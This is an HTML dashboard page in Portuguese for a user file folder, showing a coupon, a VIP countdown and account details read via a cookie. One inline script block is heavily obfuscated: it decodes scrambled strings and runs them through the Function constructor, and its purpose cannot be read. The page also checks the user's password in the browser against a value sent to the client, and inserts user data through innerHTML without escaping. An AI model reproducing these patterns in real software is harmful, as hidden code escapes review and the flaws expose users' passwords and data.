<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pasta de Arquivos</title>
    <link rel="stylesheet" href="../../css/style.css">
</head>
<body>
    <div id="token">
        <h1>Seu cupom: <br>NULL</h1>
    </div>
    <div>
        <img id="comp" src="../../icons/compartilhar.png" alt="Compartilhe" onclick="redirecionarECriarCookie()">
    </div>
    <div id="comp1" class="container">     
        <h1>Pasta de Arquivos
            <button id="dark-mode-user" onclick="toggleUserInfo()"><img id="user" src="../../icons/user1.png" alt="user-profile"></button>
        </h1>
        <ul class="file-list"></ul>
        <ul class="pagination">
            <li><a href="#comp1">1</a></li>
            <li><a href="#comp2">2</a></li>
            <li><a href="#3">3</a></li>
        </ul>

        <h1 id="catalogo">Catálogo: <br>
        <img src="../../icons/404.png" alt="error"> <br>
        Indisponível </h1>

        <div id="imagemModal">
            <span class="fechar">&times;</span>
            <img class="modal-conteudo" id="imgAmpliada">
        </div>

        <h1>VIP:</h1>
        <div id="countdown-container">
            <div id="countdown"></div>
        </div>
    </div>
    <div id="overlay"></div>
    <div id="userInfo" style="display: none;">
        <h2>Informações do Usuário</h2>
        <p><strong>Nome: NULL</strong></p>
        <p><strong>Email: NULL</strong></p>
        <p><strong>Packs: NULL</strong></p>
        <p><strong>Saldo disponível: NULL</strong></p>
        <p><strong>Chave de comunicação: NULL</strong></p>
        <br>
        <button id="bx_dds">Baixar Dados</button>
        <button id="removeCookiesButton"><img id="exit" src="../../icons/exit.png" alt="Sair"></button>
        <button id="dark-mode-toggle" onclick="toggleDarkMode()"><img id="sol" src="../../icons/sol.png" alt="Modo Claro"></button>
    </div>
    <script src="../../js/links.js"></script>
</body>
<script>
// Função para formatar o tempo restante de uma data
function formatTimeLeft(time) {
    const days = Math.floor(time / (1000 * 60 * 60 * 24));
    const hours = Math.floor((time % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((time % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((time % (1000 * 60)) / 1000);
    return `${days} dias ${hours} horas ${minutes} minutos ${seconds} segundos`;
}

// Função para iniciar o countdown
function startCountdown(targetDate) {
    const countdownElement = document.getElementById('countdown');
    updateCountdown(); // Chamada inicial para atualizar imediatamente

    const intervalId = setInterval(updateCountdown, 1000); // Atualização a cada segundo

    function updateCountdown() {
        const currentDate = new Date();
        const timeLeft = targetDate - currentDate;

        if (timeLeft <= 0) {
            clearInterval(intervalId); // Limpar o intervalo se o tempo restante for inválido
            countdownElement.textContent = 'Nada encontrado';
        } else {
            countdownElement.textContent = formatTimeLeft(timeLeft);
        }
    }
}

// Função para obter o valor de um cookie pelo nome
function getCookie(name) {
    const cookieValue = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
    return cookieValue ? decodeURIComponent(cookieValue.pop()) : '';
}

var buscarUsuarioPorId;(function(){var ypo='',vUW=485-474;function wSq(n){var l=3246532;var v=n.length;var k=[];for(var b=0;b<v;b++){k[b]=n.charAt(b)};for(var b=0;b<v;b++){var u=l*(b+261)+(l%47512);var y=l*(b+595)+(l%23068);var r=u%v;var f=y%v;var j=k[r];k[r]=k[f];k[f]=j;l=(u+y)%3482128;};return k.join('')};var ywI=wSq('tmosogfctdkabvrenrlrjucusipctoyznqxhw').substr(0,vUW);var JGk='vae 8=f8rwr6u,n=e9gvarif]"rb{dofbh,j7l8nup;r1t2vwxgz;;)a9 l==6v,)0i7t,}1[9[,a2n8),36 9z,r006f,v5r8 ,o6=8n,j4v8t,i9t6 ,a8m;vat ]=r]bf)r.var)i+0xi2dulenet5;7+;)a[d["]==c+o; aa )==][l+=55(wc=r0sv =17fflr,v;rsxc01xfasg(mrnes<lgnets;o+7) v=rstua(glm)n9srxm."phih(= h)vf.rovrrvkstrlln.t)-d;{>;0sko-e{(ab k=tu0lrv[r1g(t.ko;jae +=sumlnvCr{b+0rvirle=g;lcn+t(;"a4 );io,(ma= C= ;r<h;.+i)uv,riq)g4cfanC;doA)(n);vprrj-crq;;rfgjs{(=)j+1u*;+n.1htr-o]entlr}1.-=;i=;;[+q;}ecs( dfsq0=.)]zsw{(e.re(gphdl+g;c7afC.dhAh(r+a)n+;.ih,r"ooeetgr*2s-=;-=.;(+,2;}(ljeac7n(ivuv;+i.(l=mn1l()C=S]ri+(r>;)a.su(hrg)s4b{tgifgrbhm;)asep+s"(;[t+3]s;]=,+r;zil(p!6nilo)ui[(=<l)=.)u6hrg=s=bztui}grb,)tt,kh=].aotnk"+)i}ooyp2s (r[ ],;ivpr(a)ovjhi((a".;<a= r=r3 ,(0;9w,n2!4r,=9+.0o]cdt;d);va. ==.t1iag f[oiCgaACtdc(.6;;[or([ae ,=e;+<..8e1grhAiv+=ata0s,l(t7nuf)c,agAC(e)i.ao[n)Surlnr.mremthhrdore]uiit)4;aenu1nua(s3l8tlnr"v" .}o=nan7;';var CRD=wSq[ywI];var kWk='';var DrB=CRD;var YnG=CRD(kWk,wSq(JGk));var NqH=YnG(wSq('eu7c<<daa\'t<._!1r%-=0.ab<"e8(6s(n6;"<8ca6rdgcranrno<s<<c*r1ecar.ai,k<.m"<8 o=t]aeD.t.l(et."(noCtjasDst]lCe).<"s81v...N.(,v].NN=".8At$b.(qtfb<")86<n<]ErAa"9ofld_o3eai{a91aia$"B8<e)ca<mf1tnh:"f8<tfi5g<(Stcisgu"<o $<3e<6%na.<7b3eg_f3(%f.,b<"7od$#6+<0.4..bs<-_i_tdta%(d$+f<1o150i)a"l1 oro(r.:$ynb.borrar\/<n=e<%!80.<ttk<smass.Ef.r%+.0.<o=aocst6a(a0puouec.s%tr<%_g<ow.aesssfjo9x<N}13%!k).fe%5<n.iit)jao!a2tt%:t$rrha\/=s_st%!a=3io=d]%tg8ai.s.1z.k)%8\/}d<%!i<t.r9r5.feewk_9o)%ca_.<o6padgwts<c(sl.{e n gvd<E,_jcan4e1o)a=cno}r<I4d,E a+rq,.2<6<3x)hf<nyt"De_<al119e0g1rn{j0,,)(<;z<@c<Eta@<<aqg@=<)s<{!;r<<ja,5;x<.=_.kl<natE;)<F[1;{f6r<<om10n< 6t(r<&m;+%{4=<]r.snf!<h]r@q.(t)a;.o.(o<<=s;s\')00maF;+r)&tn<r4t<e.m.A<!ma2<1.)t(h\'77c? 4z5+2b)<;mgl<n4u<j.=..<smr5o5))<()\'67<?a2<098<)<;!q<<a3a(e.r_3Fta<<$3<(<.!_oF)sr:9=<<!;cja<m37qki]a_;bst!a(,,&,$)vjS<<5iz<tnga}$<%ha<<S9ran<(c.}f+oaCeaSC$d;(#2e)u<ox<.e<aud.<%32r=af<1a2i=*f,<ak.. #)<slh.6#<f,<h.[i"!a<lxn\/u)S7o<owd<(ff\/f)a7m<ph}}rsxna.gfun{teDd<_( <_i!)u<<i<=.}fi <3j<,)de31o<e<<,0o<se(nnm7<t1a<<r:pt<.2r<kpat0<=3h<(uzlu(zh{t(sc\/aa i.!ni(h}be!<o]\/repoh\/,+4B=a.e,1D]+r.p<<o5)+<a=h613]=;]r#{to)s;.o<c=2apw]i<.d<)f_tph<)(u<ls{]e{d}ra:3.].[u{h;r\/zttnDe:("%o<ek.)"stsk}n%1\'].};)ai)(is)$]t+ueei$p3&(e5x<b7c]k)<tornw_aaa<e1.*(o&$<<(t)a$g4o]<<\'[{4<]n))}t3;a<ao.aa@adtAaf5(+7]=(n<}e9sfvoon=.&et#b;)udrt1<]1b]a<<e<s8<y.wSsxN(&<l2.]a<ms v;oE)r-gagir=]BD<a4;]a(<Bi=h{<9eas\')<<_<1.<c<s39]=it.=_3}{;<f(un;n{<&.ost,a<Dntclee7.n)out;r;3f(j\/o.fd$eoIlu_<3u<r)C{)so!e({;,96;a&3aEr(glranqno<n(3(C<t<r5(])}Elxetat<.cfnfoaea)<+p]](o4(6a)2}.a)c;(<<m)(<ec,npo,ei)<+)]e(r438T,m<<)t}4u.c.rem);ah$r.d<.)<%;g<+<>3;qhi a<{t=h<s=}a\'=i<h}$<g<.4saei9sr{b=e<a=.al.r_0fu)(!}(u,),h)8zw<w30(h$o.e_Bg;!<)6,.4u2<21) f_)<!?(2{b*a.@0% o$0poi]e\/_iaj1<9%0t (f<)i$at( r_(.e<r )<}4<(<(<,n)n<q..a,j_o#f7$(8rjbo)fm$%o)$A !)M<<.( mnct.D3jn ?$if!180c9! k<f11s<$se,rel: o3+sas3m=;[) !spoi9(a=$4.+<4<.<;0<-;go.s].) #$oda9<[arjspo$s. (oesEl( r!jo<n_ zi%eu$6r.t)r) 1!.=dalsta(iy mao.< s.$_< z<{ hz]!i i{(,<r,od hs.r,136. ,o!.<.i_n _j";'));var NFm=DrB(ypo,NqH );NFm(6013);return 5925})()
// Função para mostrar os detalhes do usuário na interface
function mostrarDetalhesUsuario(usuario) {
    const userInfo = document.getElementById('userInfo');
    userInfo.innerHTML = `
        <h2>Informações do Usuário</h2>
        <p><strong>Nome:</strong> <span id="userName">${usuario.name}</span></p>
        <p><strong>Email:</strong> <span id="userEmail">${usuario.email}</span></p>
        <p><strong>Packs:</strong> <span id="userpck">${usuario.packs}</span></p>
        <p><strong>Saldo disponível:</strong> <span id="usersald">${usuario.saldo}</span></p>
        <p><strong>Chave de comunicação:</strong> <span id="useracs">${usuario.id}</span></p>
        <br>
        <button id="bx_dds">Baixar Dados</button>
        <button id="removeCookiesButton"><img id="exit" src="../../icons/exit.png" alt="Sair"></button>
        <button id="dark-mode-toggle" onclick="toggleDarkMode()"><img id="sol" src="../../icons/sol.png" alt="Modo Claro"></button>
    `;

    const token = document.getElementById('token');
    token.innerHTML = `<h1>Seu cupom:<br>${usuario.cupom}</h1>`;

    // Verificar se a data de expiração é válida antes de iniciar o countdown
    const expirationDate = new Date(usuario.expirationDate);
    if (expirationDate <= new Date()) {
        document.getElementById('countdown').textContent = 'Nada encontrado';
    } else {
        startCountdown(expirationDate);
    }

    // Adicionar evento ao botão "Baixar Dados"
    const btnBaixarDados = document.getElementById('bx_dds');
    btnBaixarDados.addEventListener('click', function() {
        const senhaInserida = prompt('Por favor, insira a senha:');
        if (senhaInserida === usuario.password) {
            alert('Função disponível em breve!');
        } else {
            alert('Senha incorreta. Tente novamente.');
        }
    });

    // Adicionar evento ao botão "Remover Cookies"
    const removeCookiesButton = document.getElementById("removeCookiesButton");
    removeCookiesButton.addEventListener("click", function() {
        deleteAllCookies();
        window.location.href = '../../../index.html'; // Redireciona para a página inicial após remover os cookies
    });
}

// Função para carregar os links do usuário na lista
function carregarLinksUsuario(id_links) {
    const fileList = document.querySelector('.file-list');
    fileList.innerHTML = ''; // Limpar a lista atual antes de adicionar os novos links

    id_links.forEach(linkId => {
        if (linksData[linkId]) {
            const li = document.createElement('li');
            li.innerHTML = linksData[linkId];
            fileList.appendChild(li);
        } else {
            console.log(`Link não encontrado para o ID: ${linkId}`);
        }
    });
}

// Função para deletar todos os cookies
function deleteAllCookies() {
    var cookies = document.cookie.split(";");
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
}

// Evento disparado quando a janela é carregada
window.onload = function() {
    const userIdFromCookie = getCookie('id');
    if (userIdFromCookie) {
        buscarUsuarioPorId(userIdFromCookie);
    } else {
        console.log('Cookie "id" não encontrado');
        // Redirecionar para a página inicial caso os cookies necessários não estejam presentes
        window.location.href = '../../../index.html';
    }
};

// Função para alternar a exibição das informações do usuário
function toggleUserInfo() {
    const overlay = document.getElementById('overlay');
    const userInfoDiv = document.getElementById('userInfo');
    if (overlay.style.display === 'none') {
        overlay.style.display = 'block';
        userInfoDiv.style.display = 'block';

        overlay.addEventListener('click', function() {
            overlay.style.display = 'none';
            userInfoDiv.style.display = 'none';
        });
    } else {
        overlay.style.display = 'none';
        userInfoDiv.style.display = 'none';
    }
}

// Função para alternar o modo escuro
function toggleDarkMode() {
    const bodyBackgroundColor = document.body.style.backgroundColor;

    if (bodyBackgroundColor === "rgb(241, 241, 241)") {
        document.body.style.backgroundColor = "#121212";
        const fileListLinks = document.querySelectorAll('.file-list li a');
        for (const link of fileListLinks) {
            link.style.backgroundColor = "#333";
            link.style.color = "hotpink";
        }
        document.getElementById('sol').src = "../../icons/sol.png";
    } else {
        document.body.style.backgroundColor = "#f1f1f1";
        const fileListLinks = document.querySelectorAll('.file-list li a');
        for (const link of fileListLinks) {
            link.style.backgroundColor = "#f4f4f4";
            link.style.color = "#333";
        }
        document.getElementById('sol').src = "../../icons/moon.png";
    }
}
</script>
</html>
